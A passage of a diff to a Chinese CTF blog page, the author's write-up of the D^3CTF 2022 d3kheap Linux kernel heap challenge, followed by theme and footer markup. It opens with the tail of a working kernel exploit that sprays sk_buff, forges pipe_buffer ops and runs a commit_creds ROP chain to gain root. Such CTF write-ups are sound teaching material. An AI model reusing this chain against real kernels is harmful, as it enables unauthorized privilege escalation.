class="comment">     * so that we hijack the RIP</span></span><br><span class="line"><span class="comment">     * construct a ROP on pipe_buffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pre-construct data in userspace...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) fake_secondary_msg;</span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (<span class="keyword">struct</span> pipe_buf_operations *) &amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset;</span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_rflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// for gdb attach only</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, kernel_offset + PUSH_RSI_POP_RSP_POP_4VAL_RET);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] free_pipe_info: %p\n&quot;</span>, kernel_offset + FREE_PIPE_INFO);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>运行即可完成提权，成功率比笔者最初拍脑门想的解法要高得多XD</p>
-<p><img src="https://s2.loli.net/2022/05/17/vZhdoFP5TgRc9Ul.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/05/17/vZhdoFP5TgRc9Ul.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <h1 id="0x03-其他的预期解"><a href="#0x03-其他的预期解" class="headerlink" title="0x03.其他的预期解"></a>0x03.其他的预期解</h1><p>除了笔者的官方解法以外，笔者认为以下方法应当也能解开本题（笔者未进行尝试）：</p>
 <ul>
 <li>由于整个文件系统是直接在内存中的，因此可以直接搜索内存寻找 flag（笔者本人并不推荐这种专注于 flag 本身的解法）</li>
@@ -411,9 +509,9 @@
 </ul>
 <h1 id="0x04-解题情况与非预期"><a href="#0x04-解题情况与非预期" class="headerlink" title="0x04.解题情况与非预期"></a>0x04.解题情况与非预期</h1><p>这一次的 D^3CTF 中笔者的题是第二批放出的，但在笔者放出题目后不久便被 W&amp;M 战队拿下了一血，而整个比赛中解出了这道题目的队伍也达到了 8 支之多，笔者原以为是自身出题水准不足以至于出的题目只有签到题水平于是被各大战队秒杀（虽然笔者本身就很菜），但事情往往没有笔者所想的那么简单</p>
 <p>在比赛结束时，我们发放了一份调查问卷，而笔者在其中看到了一条对笔者题目的评价——</p>
-<p><img src="https://s2.loli.net/2022/03/08/64O12YCIPXuj35t.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/03/08/64O12YCIPXuj35t.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>笔者在看到这条消息之后整个大脑一片空白，马上从比赛平台上下载下来题目附件，解压，果然在 <code>/tmp</code> 目录下看到了一个熟悉的 <code>exp</code> 文件…</p>
-<p><img src="https://s2.loli.net/2022/03/08/gartTlFBis2xALv.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/03/08/gartTlFBis2xALv.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>赛后笔者查阅选手们的 wp，<strong>确乎是有一半的队伍利用笔者留下来的 exp 解出了这道题</strong>，这也令这道题的做题体验大打折扣，在这里笔者向大家献上最诚挚的歉意🙇🏽‍♂️🙇🏽‍♂️🙇🏽‍♂️！！！</p>
 <p>不过比较幸运的一点是笔者本地测试时是直接在根目录下测试的，因此 setxattr 的第一个参数是 <code>/exp</code>，而对于远程环境而言根目录对选手是不可写的，选手的 exp 路径应当为 <code>/tmp/exp</code>，这也让这个 exp 无法被直接打通（否则可能解题队伍数量还得翻个数十倍…），不过选手仍可以逆向出 exp 逻辑后进行修改</p>
 <p>wp 中只有四支队伍是正常做题的，解法基本上都是预期解——使用 <code>msg_msg</code> 泄露信息与 <code>pipe_buffer</code> 劫持 RIP，不过都比笔者这个笨拙的解法要优秀上许多（笑），基本上可以归为两种题解：</p>
@@ -444,453 +542,467 @@
 <li>对于 5.14 及往上版本的内核，<strong>setxattr 与 msgsnd 不会从同一张 slub 上取 object</strong>（一个是 <code>GFP_KERNEL_ACCOUNT</code> 而另一个是 <code>GPF_KERNEL</code>，但这两个 flag 在之前的版本中似乎并不会造成 slub 的隔离），但笔者尚未发现 5.14 内核中 slub 涉及的源码的相关改动（笔者仅粗略检索了源码）</li>
 </ul>
 
-      </div>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
       
-        <div class="prev-or-next">
-          <div class="post-foot-next">
-            
-              <a href="/2022/02/21/EXPR-0X00-MIT_6_828/" target="_self">
-                <i class="iconfont icon-chevronleft"></i>
-                <span>上一页</span>
-              </a>
-            
-          </div>
-          <div class="post-attach">
-            <span class="post-pubtime">
-              <i class="iconfont icon-updatetime" title="更新时间"></i>
-              2022-03-08 18:25:07
-            </span>
-            
-                  <span class="post-categories">
-                    <i class="iconfont icon-bookmark" title="分类"></i>
-                    
-                    <span class="span--category">
-                      <a href="/categories/CTF/" title="CTF">
-                        <b>#</b> CTF
-                      </a>
-                    </span>
-                    
-                  </span>
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Pwn/">#Pwn</a>
+      
+        <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">#信息安全</a>
+      
+        <a href="/tags/CTF/">#CTF</a>
+      
+        <a href="/tags/Use-After-Free/">#Use After Free</a>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+        <a href="/tags/Linux-Kernel/">#Linux Kernel</a>
+      
+        <a href="/tags/Kernel-UAF/">#Kernel UAF</a>
+      
+        <a href="/tags/D-3CTF/">#D^3CTF</a>
+      
+    </div>
+  
+</div>
+
+
               
-                  <span class="post-tags">
-                    <i class="iconfont icon-tags" title="标签"></i>
-                    
-                    <span class="span--tag">
-                      <a href="/tags/Pwn/" title="Pwn">
-                        <b>#</b> Pwn
-                      </a>
-                    </span>
-                    
-                    <span class="span--tag">
-                      <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="信息安全">
-                        <b>#</b> 信息安全
-                      </a>
-                    </span>
-                    
-                    <span class="span--tag">
-                      <a href="/tags/CTF/" title="CTF">
-                        <b>#</b> CTF
-                      </a>
-                    </span>
-                    
-                    <span class="span--tag">
-                      <a href="/tags/Use-After-Free/" title="Use After Free">
-                        <b>#</b> Use After Free
-                      </a>
-                    </span>
-                    
-                    <span class="span--tag">
-                      <a href="/tags/Linux/" title="Linux">
-                        <b>#</b> Linux
-                      </a>
-                    </span>
-                    
-                    <span class="span--tag">
-                      <a href="/tags/Linux-Kernel/" title="Linux Kernel">
-                        <b>#</b> Linux Kernel
-                      </a>
-                    </span>
-                    
-                    <span class="span--tag">
-                      <a href="/tags/Kernel-UAF/" title="Kernel UAF">
-                        <b>#</b> Kernel UAF
-                      </a>
-                    </span>
-                    
-                    <span class="span--tag">
-                      <a href="/tags/D-3CTF/" title="D^3CTF">
-                        <b>#</b> D^3CTF
-                      </a>
-                    </span>
-                    
-                  </span>
-              
-          </div>
-          <div class="post-foot-prev">
-            
-              <a href="/2022/03/12/CVE-0X06-CVE-2022-0847/" target="_self">
-                <span>下一页</span>
-                <i class="iconfont icon-chevronright"></i>
-              </a>
-            
-          </div>
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>【CTF.0x06】D^ 3CTF2022 d3kheap 出题手记</div>
+      <div>http://blog.arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>arttnba3</div>
         </div>
       
-    </div>
-    
-  <div id="btn-catalog" class="btn-catalog">
-    <i class="iconfont icon-catalog"></i>
-  </div>
-  <div class="post-catalog hidden" id="catalog">
-    <div class="title">目录</div>
-    <div class="catalog-content">
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E4%B8%80%E5%88%87%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D"><span class="toc-text">0x00.一切开始之前</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-text">0x01.题目分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">0x02.漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-UAF"><span class="toc-text">构造 UAF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A%E5%88%A9%E7%94%A8-setxattr-%E5%A4%9A%E6%AC%A1%E5%8A%AB%E6%8C%81-msg-msg"><span class="toc-text">解法一：利用 setxattr 多次劫持 msg_msg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-I-setxattr-%E4%BF%AE%E6%94%B9-object-%E5%86%85%E5%AE%B9"><span class="toc-text">Step.I setxattr 修改 object 内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-II-msg-msg-%E6%90%9C%E7%B4%A2%E5%86%85%E5%AD%98%E5%AE%8C%E6%88%90%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="toc-text">Step.II msg_msg 搜索内存完成地址泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-III-%E6%9E%84%E9%80%A0-A-gt-B-gt-A-%E5%BC%8F-freelist-%E5%8A%AB%E6%8C%81%E6%96%B0%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-text">Step.III 构造 A-&gt;B-&gt;A 式 freelist 劫持新的结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-IV-pipe-buffer-%E5%8A%AB%E6%8C%81-RIP"><span class="toc-text">Step.IV pipe_buffer 劫持 RIP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FINAL-EXPLOIT"><span class="toc-text">FINAL EXPLOIT</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9Amsg-msg-sk-buff-%E5%A0%86%E5%96%B7"><span class="toc-text">解法二：msg_msg + sk_buff 堆喷</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-I-%E5%A0%86%E5%96%B7-msg-msg-%EF%BC%8C%E5%BB%BA%E7%AB%8B%E4%B8%BB%E4%BB%8E%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97"><span class="toc-text">Step.I 堆喷 msg_msg ，建立主从消息队列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-II-%E6%9E%84%E9%80%A0-UAF%EF%BC%8C%E5%A0%86%E5%96%B7-sk-buff-%E5%AE%9A%E4%BD%8D-victim-%E9%98%9F%E5%88%97"><span class="toc-text">Step.II 构造 UAF，堆喷 sk_buff 定位 victim 队列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-III-%E5%A0%86%E5%96%B7-sk-buff-%E4%BC%AA%E9%80%A0%E8%BE%85%E5%8A%A9%E6%B6%88%E6%81%AF%EF%BC%8C%E6%B3%84%E9%9C%B2-UAF-obj-%E5%9C%B0%E5%9D%80"><span class="toc-text">Step.III 堆喷 sk_buff 伪造辅助消息，泄露 UAF obj 地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-IV-%E5%A0%86%E5%96%B7-pipe-buffer%EF%BC%8C%E6%B3%84%E9%9C%B2%E5%86%85%E6%A0%B8%E5%9F%BA%E5%9D%80"><span class="toc-text">Step.IV 堆喷 pipe_buffer，泄露内核基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-V-%E4%BC%AA%E9%80%A0-pipe-buffer%EF%BC%8C%E6%9E%84%E9%80%A0-ROP%EF%BC%8C%E5%8A%AB%E6%8C%81-RIP%EF%BC%8C%E5%AE%8C%E6%88%90%E6%8F%90%E6%9D%83"><span class="toc-text">Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Final-EXPLOIT"><span class="toc-text">Final EXPLOIT</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%85%B6%E4%BB%96%E7%9A%84%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-text">0x03.其他的预期解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E8%A7%A3%E9%A2%98%E6%83%85%E5%86%B5%E4%B8%8E%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-text">0x04.解题情况与非预期</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E6%80%BB%E7%BB%93%E4%B8%8E%E5%8F%8D%E6%80%9D"><span class="toc-text">0x05.总结与反思</span></a></li></ol>
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年3月8日</div>
+        </div>
       
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
     </div>
+    <div class="license-icon iconfont"></div>
   </div>
 
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/12/CVE-0X06-CVE-2022-0847/" title="【CVE.0x06】CVE-2022-0847 漏洞复现及简要分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">【CVE.0x06】CVE-2022-0847 漏洞复现及简要分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/02/21/EXPR-0X00-MIT_6_828/" title="【EXPR.0x00】MIT 6.828 课程实验报告">
+                        <span class="hidden-mobile">【EXPR.0x00】MIT 6.828 课程实验报告</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appid":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appkey":"tuvJh3xYxPFcW2JB6K26RKP2","path":"window.location.pathname","placeholder":"说点什么呗（笑）","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"appId":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appKey":"tuvJh3xYxPFcW2JB6K26RKP2"},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
   
-<script src="/js/catalog.js"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
 
 
 
 
     
-      <div class="comments-container">
-        
 
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
 
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  <!-- 网站运行时间的设置 -->
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+      var now = new Date();
+      function createtime() {
+          var grt= new Date("04/20/2020 17:48:48");//此处修改你的建站时间或者网站上线时间
+          now.setTime(now.getTime()+250);
+          days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+          if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+          mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+          snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+          document.getElementById("timeDate").innerHTML = "arttnba3的小屋已经安全存在了 "+dnum+" 天 ";
+          document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+      }
+  setInterval("createtime()",250);
+  </script>
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
 
   
-    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
   
+</div>
 
-  <div id="vcomments"></div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
 
   <script>
-    function loadValineSuc() {
-      new Valine({
-        el: '#vcomments',
-        appId: 'ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz',
-        appKey: 'tuvJh3xYxPFcW2JB6K26RKP2',
-        placeholder: '说点什么呗...',
-        avatar: 'retro',
-        lang: 'zh-CN'
-      })
-    }
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
   </script>
 
-    <style>
-      .comments-container .v .vempty {
-        display: none!important;
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
       }
-    </style>
-
-
-
-
-      </div>
-    
-  </div>
-
-
-        
-<div class="footer">
-  <div class="social">
-    <ul>
+      var text = subtitle.getAttribute('data-typed-text');
       
-        <li>
-          <a title="github" target="_blank" rel="noopener" href="https://github.com/arttnba3">
-            <i class="iconfont icon-github"></i>
-          </a>
-        </li>
+        typing(text);
       
-        <li>
-          <a title="email" href="mailto:arttnba@gmail.com">
-            <i class="iconfont icon-envelope"></i>
-          </a>
-        </li>
-      
-        <li>
-          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/arttnba3">
-            <i class="iconfont icon-twitter"></i>
-          </a>
-        </li>
-      
-        <li>
-          <a title="rss" href="/atom.xml">
-            <i class="iconfont icon-rss"></i>
-          </a>
-        </li>
-      
-    </ul>
-  </div>
+    })(window, document);
+  </script>
+
+
+
+
   
-    
-    <div class="footer-more">
-      
-        <a target="_blank" rel="noopener" href="https://github.com/arttnba3">Copyright © 2022 arttnba3</a>
-        
-    </div>
+    <script  src="/js/img-lazyload.js" ></script>
   
-    
-    <div class="footer-more">
-      
-        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
-        
-    </div>
+
+
+
+
   
-</div>
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
 
-      </div>
-
-      <div class="tools-bar">
-        <div class="back-to-top tools-bar-item hidden">
-  <a href="javascript: void(0)">
-    <i class="iconfont icon-chevronup"></i>
-  </a>
-</div>
-
-
-<script src="/js/backtotop.js"></script>
-
-
-
-        
-  <div class="search-icon tools-bar-item" id="search-icon">
-    <a href="javascript: void(0)">
-      <i class="iconfont icon-search"></i>
-    </a>
-  </div>
-
-  <div class="search-overlay hidden">
-    <div class="search-content" tabindex="0">
-      <div class="search-title">
-        <span class="search-icon-input">
-          <a href="javascript: void(0)">
-            <i class="iconfont icon-search"></i>
-          </a>
-        </span>
-        
-          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
-        
-        <span class="search-close-icon" id="search-close-icon">
-          <a href="javascript: void(0)">
-            <i class="iconfont icon-close"></i>
-          </a>
-        </span>
-      </div>
-      <div class="search-result" id="search-result"></div>
-    </div>
-  </div>
-
-  <script type="text/javascript">
-    var inputArea = document.querySelector("#search-input")
-    var searchOverlayArea = document.querySelector(".search-overlay")
-
-    inputArea.onclick = function() {
-      getSearchFile()
-      this.onclick = null
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
     }
+  });
+</script>
 
-    inputArea.onkeydown = function() {
-      if(event.keyCode == 13)
-        return false
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
     }
-
-    function openOrHideSearchContent() {
-      let isHidden = searchOverlayArea.classList.contains('hidden')
-      if (isHidden) {
-        searchOverlayArea.classList.remove('hidden')
-        document.body.classList.add('hidden')
-        // inputArea.focus()
-      } else {
-        searchOverlayArea.classList.add('hidden')
-        document.body.classList.remove('hidden')
-      }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
     }
-
-    function blurSearchContent(e) {
-      if (e.target === searchOverlayArea) {
-        openOrHideSearchContent()
-      }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
     }
+    window.anchors.add(res.join(', '));
+  });
+</script>
 
-    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
-    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
-    searchOverlayArea.addEventListener("click", blurSearchContent, false)
 
-    var searchFunc = function (path, search_id, content_id) {
-      'use strict';
-      var $input = document.getElementById(search_id);
-      var $resultContent = document.getElementById(content_id);
-      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
-      $.ajax({
-        // 0x01. load xml file
-        url: path,
-        dataType: "xml",
-        success: function (xmlResponse) {
-          // 0x02. parse xml file
-          var datas = $("entry", xmlResponse).map(function () {
-            return {
-              title: $("title", this).text(),
-              content: $("content", this).text(),
-              url: $("url", this).text()
-            };
-          }).get();
-          $resultContent.innerHTML = "";
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
 
-          $input.addEventListener('input', function () {
-            // 0x03. parse query to keywords list
-            var str = '<ul class=\"search-result-list\">';
-            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-            $resultContent.innerHTML = "";
-            if (this.value.trim().length <= 0) {
-              return;
-            }
-            // 0x04. perform local searching
-            datas.forEach(function (data) {
-              var isMatch = true;
-              var content_index = [];
-              if (!data.title || data.title.trim() === '') {
-                data.title = "Untitled";
-              }
-              var orig_data_title = data.title.trim();
-              var data_title = orig_data_title.toLowerCase();
-              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
-              var data_content = orig_data_content.toLowerCase();
-              var data_url = data.url;
-              var index_title = -1;
-              var index_content = -1;
-              var first_occur = -1;
-              // only match artiles with not empty contents
-              if (data_content !== '') {
-                keywords.forEach(function (keyword, i) {
-                  index_title = data_title.indexOf(keyword);
-                  index_content = data_content.indexOf(keyword);
 
